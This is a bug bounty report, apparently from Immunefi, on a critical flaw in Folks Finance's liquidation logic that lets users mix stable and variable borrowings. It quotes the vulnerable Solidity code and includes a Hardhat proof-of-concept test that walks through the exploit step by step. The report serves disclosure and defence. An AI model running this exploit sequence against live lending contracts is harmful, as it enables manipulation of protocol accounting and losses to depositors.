# Boost \_ Folks Finance 34190 - \[Smart Contract - Critical] Liquidated users can mix and manipulate st

Submitted on Tue Aug 06 2024 07:49:14 GMT-0400 (Atlantic Standard Time) by @zarkk for [Boost | Folks Finance](https://immunefi.com/bounty/folksfinance-boost/)

Report ID: #34190

Report type: Smart Contract

Report severity: Critical

Target: <https://testnet.snowtrace.io/address/0xc1FBF54B25816B60ADF322d8A1eaCA37D9A50317>

Impacts:

* Protocol insolvency

## Description

## Brief/Intro

Users can mix their `UserLoanBorrow` with both stable and variable borrowings manipulating a check on `LiquidationLogic` and, in this way, pay less interest and mess up `HubPool` accountings.

## Vulnerability Details

During the liquidation process in Folks Finance, there is a critical check within the `prepareLiquidation` function of the `LiquidationLogic` contract. This check ensures that the borrowings of the liquidated user (violator) cannot be transferred to the liquidator's `UserLoanBorrow` account if the liquidator already has an active debt of a different borrowing type (stable or variable). The relevant code snippet is shown below:

```solidity
function prepareLiquidation(
        // ...
    ) external returns (DataTypes.LoanLiquidityParams memory violatorLiquidity) {
        // ...

        bool isViolatorStableBorrow = violatorLoanBorrow.stableInterestRate > 0;
        bool isLiquidatorStableBorrow = liquidatorLoanBorrow.stableInterestRate > 0;
@>        if (liquidatorLoanBorrow.amount > 0 && isViolatorStableBorrow != isLiquidatorStableBorrow)
            revert BorrowTypeMismatch(loansParams.violatorLoanId, loansParams.liquidatorLoanId, borrPoolId);

        // ...
    }
```

This code snippet ensures that if the liquidator already has an active borrowing, he cannot combine it with the violator’s borrowing if the types differ.

However, an exploit exists where the liquidator can have `liquidatorLoanBorrow.amount == 0` while still having an active borrowing balance, thereby bypassing the check and allowing the liquidation to proceed without reverting. This creates a scenario where the system does not verify whether the two borrowings (liquidator's and violator's) are of the same type, leading to an unintended mixture of stable and variable borrowings in a single loan account. Let's see how this is possible.

If we examine liquidation process, we can see that during `transferBorrowFromViolator` of `UserLoanLogic` there is a way for the `borrow.amount` to be zeroed out while the `borrow.balance` to be non-zero and, therefore, has active borrow debt. We can this here :

```solidity
function transferBorrowFromViolator(
        LoanManagerState.UserLoan storage loan,
        uint8 poolId,
        uint256 repayBorrowAmount
    ) external returns (uint256 repaidBorrowAmount, uint256 repaidBorrowBalance, uint256 loanStableRate) {
        LoanManagerState.UserLoanBorrow storage loanBorrow = loan.borrows[poolId];

        // violator loanBorrow has beed updated in prepareLiquidation

        repaidBorrowBalance = repayBorrowAmount;
@>        repaidBorrowAmount = Math.min(repaidBorrowBalance, loanBorrow.amount);
        loanStableRate = loanBorrow.stableInterestRate;

@>        loanBorrow.amount -= repaidBorrowAmount;
        loanBorrow.balance -= repaidBorrowBalance;

        if (loanBorrow.balance == 0) clearBorrow(loan, poolId);
    }
```

This is not hard to be accomplished by a user who can just borrow slightly more than his collateral, effectively making himself near under-collateralized and then immediately liquidate himself by the max amount he is able to and zero out the `borrow.amount` letting his `borrow.balance` to be > 0.

This exploit is particularly effective when there is a significant difference between the `amount` and `balance`, indicating substantial accrued interest.

Users can then liquidate their own loans and those of others to mix and match borrowing types to their advantage. This could happen either intentionally or through someone else liquidating them, allowing them to exploit the system further.

For detailed transaction flows, refer to the Proof of Concept (PoC).

## Impact Details

The impact of this vulnerability is significant. If exploited on a large scale, it could severely disrupt the accounting within the protocol's `HubPool` for both stable and variable borrowings. This opens the door for malicious actors to take advantage of different interest rates and indexes, enabling them to manipulate their borrowings in a way that is highly beneficial to them but detrimental to the protocol. This could undermine the financial stability of the platform and violate the intended logic of the system.

## References

<https://github.com/Folks-Finance/folks-finance-xchain-contracts/blob/fb92deccd27359ea4f0cf0bc41394c86448c7abb/contracts/hub/logic/LiquidationLogic.sol#L127> <https://github.com/Folks-Finance/folks-finance-xchain-contracts/blob/fb92deccd27359ea4f0cf0bc41394c86448c7abb/contracts/hub/logic/UserLoanLogic.sol#L124>

## Proof of concept

## Proof of Concept

To demonstrate this vulnerability, the following test can be added under the `"Liquidate"` section in `LoanManager.test.ts` and run using `npm test`. The comments in the code are crucial for understanding the logic and transaction flow:

```javascript
it.only("Should let a liquidated variable borrowing user to be able to liquidate another stable borrowing user and mix his borrowings ", async () => {
      const {
        hub,
        loanManager,
        oracleManager,
        pools,
        loanId: violatorLoanId,
        accountId: violatorAccountId,
        loanTypeId,
        borrowAmount,
        usdcVariableInterestIndex: oldVariableInterestIndex,
      } = await loadFixture(depositEtherAndVariableBorrowUSDCFixture);

      // Config the liquidator.
      const liquidatorLoanId = getRandomBytes(BYTES32_LENGTH);
      const liquidatorAccountId = getAccountIdBytes("LIQUIDATOR_ACCOUNT_ID");
      const liquidatorLoanName = getRandomBytes(BYTES32_LENGTH);
      await loanManager.connect(hub).createUserLoan(liquidatorLoanId, liquidatorAccountId, loanTypeId, liquidatorLoanName);
      const liquidatorDepositAmount = BigInt(10000e6); // 10,000 USDC
      const liquidatorDepositFAmount = liquidatorDepositAmount;
      const liquidatorDepositInterestIndex = BigInt(1e18);
      const usdcPrice = BigInt(1e18);
      await pools.USDC.pool.setDepositPoolParams({fAmount: liquidatorDepositFAmount,depositInterestIndex: liquidatorDepositInterestIndex,priceFeed: { price: usdcPrice, decimals: pools.USDC.tokenDecimals },});
      await loanManager.connect(hub).deposit(liquidatorLoanId, liquidatorAccountId, pools.USDC.poolId, liquidatorDepositAmount);

      // Prepare liquidation
      const ethNodeOutputData = getNodeOutputData(BigInt(1100e18)); // ETH Price at $1,100
      await oracleManager.setNodeOutput(pools.ETH.poolId, pools.ETH.tokenDecimals, ethNodeOutputData);

      // Interest calculations
      const variableInterestIndex = BigInt(1.5e18); // Variable index is 1,5 so to do it more easy to understand.
      const stableInterestRate = BigInt(0.1e18);
      await pools.USDC.pool.setBorrowPoolParams({ variableInterestIndex, stableInterestRate });
      await pools.USDC.pool.setUpdatedVariableBorrowInterestIndex(variableInterestIndex);
      const borrowBalance = calcBorrowBalance(borrowAmount, variableInterestIndex, oldVariableInterestIndex);

      console.log("borrowBalance", borrowBalance.toString()); // Borrow balance is around 1400 USDC.
      console.log("borrowAmount", borrowAmount.toString()); // Borrow amount is 1000 USDC.

      const seizeCollateralAmount = BigInt(1e18); // 1 ETH = $1,100 = 1100 USDC
      const repayAmount = convToRepayBorrowAmount(
        seizeCollateralAmount,
        ethNodeOutputData.price,
        pools.ETH.tokenDecimals,
        usdcPrice,
        pools.USDC.tokenDecimals,
        BigInt(0.04e4)
      );
      console.log("repayAmount", repayAmount.toString()); // Repay amount is around 1144 USDC, so it is bigger than the violator's borrow amount.
      const attemptedRepayAmount = repayAmount + BigInt(10e6);

      // Liquidation is executed.
      const minSeizedAmount = BigInt(0);
      const liquidate = await loanManager
        .connect(hub)
        .liquidate(
          violatorLoanId,
          liquidatorLoanId,
          liquidatorAccountId,
          pools.ETH.poolId,
          pools.USDC.poolId,
          attemptedRepayAmount,
          minSeizedAmount
        );

      // Now, violator's user loan borrow has 0 USDC amount and around 300 USDC balance. This means that it will pass the check in prepareLiquidation() if he tries to liquidate someone else STABLE type of borrowings.
      // Remember, the violator's borrow is VARIABLE.

      // Config a new violator which will have STABLE borrowing. The previous violator which was VARIABLE borrowing will try to liquidate this new violator and it will not revert even if there is type mismatch.
      // In this way the previous violator will gain stable borrowing amounts in his variable borrowing loan, and this can be vice versa.
        const newViolatorsLoanId = getRandomBytes(BYTES32_LENGTH);
        const newViolatorsAccountId = getAccountIdBytes("NEW_VIOLATOR_ACCOUNT_ID");
        const newViolatorsLoanName = getRandomBytes(BYTES32_LENGTH);
        await loanManager.connect(hub).createUserLoan(newViolatorsLoanId, newViolatorsAccountId, loanTypeId, newViolatorsLoanName);

        // New violator deposit.
        const depositAmount = BigInt(1e18); // 1 ETH
        const depositFAmount = depositAmount;
        const depositInterestIndex = BigInt(1e18);
        const ethPrice = BigInt(3000e18);
        await pools.ETH.pool.setDepositPoolParams({
          fAmount: depositFAmount,
          depositInterestIndex,
          priceFeed: { price: ethPrice, decimals: pools.ETH.tokenDecimals },
        });
        const deposit = await loanManager.connect(hub).deposit(newViolatorsLoanId, newViolatorsAccountId, pools.ETH.poolId, depositAmount);

        // New violator stable borrowing of 1000 USDC.
        const usdcNodeOutputData = getNodeOutputData(BigInt(1e18));
        await oracleManager.setNodeOutput(pools.USDC.poolId, pools.USDC.tokenDecimals, usdcNodeOutputData);
        const ethNodeOutputData3 = getNodeOutputData(BigInt(3000e18));
        await oracleManager.setNodeOutput(pools.ETH.poolId, pools.ETH.tokenDecimals, ethNodeOutputData3);
        await pools.USDC.pool.setBorrowPoolParams({ variableInterestIndex, stableInterestRate });
        await pools.USDC.pool.setUpdatedVariableBorrowInterestIndex(variableInterestIndex);
        const borrowAmountNewViolator = BigInt(2000e6); // 2000 USDC
        const borrow = await loanManager
          .connect(hub)
          .borrow(newViolatorsLoanId, newViolatorsAccountId, pools.USDC.poolId, borrowAmountNewViolator, stableInterestRate);

        // New violator has 2000 USDC borrowed and 1 ETH collateral of $3000.
        
        // Before the liquidation, the previous violator which will now be liquidator has to deposit some ETH.
        const depositAmountPrevViol = BigInt(1e18); // 1 ETH
        const depositFAmountViol = depositAmountPrevViol;
        const ethPrice2 = BigInt(3000e18);
        await pools.ETH.pool.setDepositPoolParams({
          fAmount: depositFAmountViol,
          depositInterestIndex,
          priceFeed: { price: ethPrice2, decimals: pools.ETH.tokenDecimals },
        });
        const depositViol = await loanManager.connect(hub).deposit(violatorLoanId, violatorAccountId, pools.ETH.poolId, depositAmountPrevViol);

        //  Now let's make the new violator's loan to be liquidatable by the previous violator and in this way the borrowing of previous violator in USDC will be mixed up with stable and variable borrowings.
        const ethNodeOutputData2 = getNodeOutputData(BigInt(600e18)); // 
        await oracleManager.setNodeOutput(pools.ETH.poolId, pools.ETH.tokenDecimals, ethNodeOutputData2);

        // Here, the previous violator will try to liquidate the new violator and get from him the variable borrowings which he has in his loan.
        const liquidate2 = await loanManager
        .connect(hub)
        .liquidate(
          newViolatorsLoanId,
          violatorLoanId,
          violatorAccountId,
          pools.ETH.poolId,
          pools.USDC.poolId,
          BigInt(50e6),
          BigInt(0)
        );

        // Eventually, previous violators UserLoanBorrow for USDC will have amount and balance gained from both stable and variable borrowings and in this way the protocols accountings can be gamed. Also, it will have stableInterestRate of the new violator.

        // TLDR: A user was borrowed USDC variable but after his liquidation, he was able to liquidate another user and gain his stable USDC borrowings and in this way his borrowings was from mixed sources. The accountings of protocol were gamed, at the end.
    });
```

This test demonstrates how a user can exploit the system to mix stable and variable borrowings, thereby compromising the protocol.
